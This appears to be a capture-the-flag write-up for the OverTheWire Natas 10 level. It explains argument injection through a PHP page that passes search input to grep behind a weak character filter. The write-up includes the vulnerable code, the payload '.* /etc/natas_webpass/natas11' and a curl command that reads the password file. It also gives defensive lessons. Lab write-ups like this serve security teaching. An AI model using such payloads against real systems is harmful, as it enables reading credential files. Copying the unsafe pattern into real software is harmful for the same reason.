# Natas 10 → Natas 11

## Level Information

* URL: `http://natas10.natas.labs.overthewire.org`
* Username: `natas10`
* Password: `[REDACTED]`

## Goal

Find the password for the next level, `natas11`.

## Page Observation

When I opened the page, I saw a search form:

```text
Find words containing:
```

The page also displayed this message:

```text
For security reasons, we now filter on certain characters
```

There was also a link:

```text
View sourcecode
```

This level looks similar to Natas 9, but some dangerous command characters are now filtered.

## Concept

This level introduces incomplete command injection protection.

In the previous level, command injection was possible by using shell command separators such as:

```text
;
|
&
```

In this level, those characters are filtered. However, the application still passes user input into a Linux command. This means the command can still be abused by changing the command arguments.

This is also known as argument injection.

## Source Code Review

After clicking `View sourcecode`, I found logic similar to this:

```php
if(preg_match('/[;|&]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

The application blocks some characters, but it still places user input directly inside the command:

```bash
grep -i [user_input] dictionary.txt
```

This is unsafe because the user can still control what files `grep` reads.

## Vulnerability Explanation

The intended command is:

```bash
grep -i [word] dictionary.txt
```

But by entering:

```text
.* /etc/natas_webpass/natas11
```

the command becomes similar to:

```bash
grep -i .* /etc/natas_webpass/natas11 dictionary.txt
```

This makes `grep` search inside the password file:

```text
/etc/natas_webpass/natas11
```

The pattern `.*` means “match anything,” so `grep` prints the content of the password file.

## Steps

1. Opened the Natas 10 page.
2. Clicked `View sourcecode`.
3. Reviewed the PHP source code.
4. Noticed that the application filters only these characters:

```text
;
|
&
```

5. Identified that the input is still passed into the `grep` command.
6. Entered this payload into the search box:

```text
.* /etc/natas_webpass/natas11
```

7. Clicked `Search`.
8. The page displayed the password for `natas11`.

## Browser Method

Payload used:

```text
.* /etc/natas_webpass/natas11
```

Submit it on:

```text
http://natas10.natas.labs.overthewire.org/
```

## Terminal Method

```bash
curl -u natas10:[REDACTED] \
--data-urlencode "needle=.* /etc/natas_webpass/natas11" \
--data "submit=Search" \
http://natas10.natas.labs.overthewire.org/
```

## Result

After submitting the payload, the server executed `grep` with the password file as an argument and displayed the password for `natas11`.

## Lesson Learned

Filtering only a few dangerous characters is not enough to prevent command injection. Even if command separators are blocked, user input can still modify command arguments.

To prevent this vulnerability, developers should avoid passing user input into shell commands. If command execution is required, they should use strict allowlists, safe APIs, and proper escaping.

## Password

```text
[REDACTED]
```
